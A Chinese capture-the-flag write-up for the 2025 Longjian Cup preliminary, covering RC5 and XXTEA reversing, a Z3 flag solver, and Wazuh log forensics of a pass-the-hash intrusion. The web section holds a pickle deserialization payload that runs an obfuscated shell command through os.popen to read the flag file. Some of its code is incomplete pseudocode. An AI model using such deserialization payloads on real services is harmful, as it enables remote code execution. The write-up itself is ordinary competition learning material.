---
title: 第三届"陇剑杯"网络安全大赛预选赛 WP
contest: 第三届陇剑杯预选赛
year: 2025
difficulty: hard
vuln_type: misc_unknown
tags: [陇剑杯预选赛, RC5-32/12/b算法, Z3约束求解, 多约束校验, XXTEA, pickle反序列化, Wazuh日志分析, PTH哈希传递, PSEXESVC]
attack_chain: RC5-32/12/b key_schedule→decrypt_buffer→PKCS#7去填充→Z3约束求解(22字节flag+5个mvals+7个xvals+32位popcount)→XXTEA解密→pickle反序列化CHIKAWA→Wazuh日志分析
key_payload: "RC5-32/12/b rol32/ror32/0xB7E15163;flag{7ac1d3e59f0b2468};flag{cbee3251-9cff-4542-bf15-337bb8df7f3f};PSEXESVC;data.win.system.eventID:7045;hash attack事件ID=1734511987.34749419"
one_liner: 第三届陇剑杯预选赛：RC5-32/12/b+Z3多约束+XXTEA+pickle反序列化+Wazuh应急响应
lesson: RC5算法key_schedule+decrypt块解密；Z3约束+popcount处理32位校验
quality: high
---

# 第三届"陇剑杯"网络安全大赛预选赛 WP

**赛事**：第三届陇剑杯预选赛（2025）

**第一部分：要求的值（RC5算法）**

**RC5-32/12/b 实现**：
```c
uint32_t rol32(uint32_t x, uint32_t n) {
    n &= 0x1F;
    return (x << n) | (x >> (32 - n));
}

vector<uint32_t> key_schedule(const vector<uint8_t>& key_bytes, size_t S_len) {
    // L = (key_bytes.size() + 3) / 4
    // S[0] = 1766649740; add_const = 1422508807  // 0x9E3779B9
    // rounds = 3 * max(S_len, L_len)
    // 状态更新: v = S[idxS]; v7 = (k ^ rol32(v15 + v16 + v, 3))
    ...
}

void decrypt_block(const uint8_t* block8, uint32_t* S, int rounds_count, uint8_t* out) {
    uint32_t v15 = *(uint32_t*)block8;
    uint32_t v13 = *(uint32_t*)(block8 + 4);
    for (int k = rounds_count; k >= 1; --k) {
        uint32_t tmp = v13 ^ v15;
        uint32_t v13_in = ror32(tmp, v15) - S[2*k + 1];
        uint32_t v15_in = ror32(v15 ^ v13_in, v13_in) - S[2*k];
        v13 = v13_in; v15 = v15_in;
    }
    uint32_t v14 = v15 - S[0];
    uint32_t v12 = v13 - S[1];
    memcpy(out, &v14, 4);
    memcpy(out + 4, &v12, 4);
}
```

**第二部分：Z3约束求解**

```python
from z3 import *

# 多约束校验
mvals = [0x03, 0x05, 0x09, 0x0B, 0x0D]
xvals = [0xA5, 0x5C, 0xC3, 0x96, 0x3E, 0xD7, 0x21]

f = [BitVec(f'f{i}', 8) for i in range(22)]
# flag{ ... } 22字节
# 中间16字符 hex 范围

# 转换: tb[i] = r8((mvals[i%5]*f[i] + (19*i+79)&0xFF) ^ xvals[i%7], i%5)

# 32位累加 + popcount
v42 = pop32累加和

# 多组约束
v21 = dw[0]; v20 = r32(v21, 5)
v37 = (dw[2] - 0x61C88647) ^ v20
v18 = dw[4] ^ 0xDEADBEEF
v19 = dw[7]
n172 = (r32(v19, 11) + v18 + v37) ^ 0xA5A5A5A5

# XTEA-like 2轮
v33 = dw[3] ^ 0x13579BDF
v9 = r32((m ^ 0x9E3779B9) - (0x7A2C7E89 * v32), 5*m+5)
v30 = r32(v32, 11) ^ v32 ^ v9 ^ v33

# 求解
if solver.check() == sat:
    flag = ''.join(chr(model[f[i]].as_long()) for i in range(22))
```

**flag**：`flag{7ac1d3e59f0b2468}`

**第三部分：XXTEA**
- 找到 .rdata 中 expected_values 表
- check_func 逐字节比较
- XXTEA算法求解密文和密钥

**flag**：`flag{cbee3251-9cff-4542-bf15-337bb8df7f3f}`

**WEB（pickle反序列化）**：
```python
import pickle
import requests

class CHIKAWA:
    def __init__(self, payload):
        self.model_name = "123"
        self.data = payload.encode()
        self.parameters = []

payload = """cos
popen(Vtouch "/tmp/`/bin/ca? /?lag`"tR."""
payload = pickle.dumps(CHIKAWA(payload))
exec_(upload(payload))
```

**应急（Wazuh日志分析）**：
- flag1: 攻击者IP = 192.168.41.143（搜索"GET /"）
- flag2: 攻击时间段登录成功终端会话数 = 13
- flag3: 攻击者遗留后门系统用户 = hacker
- flag4: 命令行请求网页完整URL = `http://192.168.41.136/.back.php?pass=id`
- flag5: 哈希传递攻击事件ID = 1734511987.34749419
- flag6: 域攻击工具 = PSEXESVC（搜索语法`data.win.system.eventID:7045 AND data.win.eventdata.serviceName:PSEXESVC`）

**核心技术**：
- RC5-32/12/b 完整实现
- Z3约束求解 + popcount处理
- XXTEA算法
- pickle反序列化
- Wazuh日志分析（应急响应）
- PTH（Pass-the-Hash）哈希传递攻击

**质量评估**：高（RC5 + Z3 + XXTEA + pickle + Wazuh六合一）
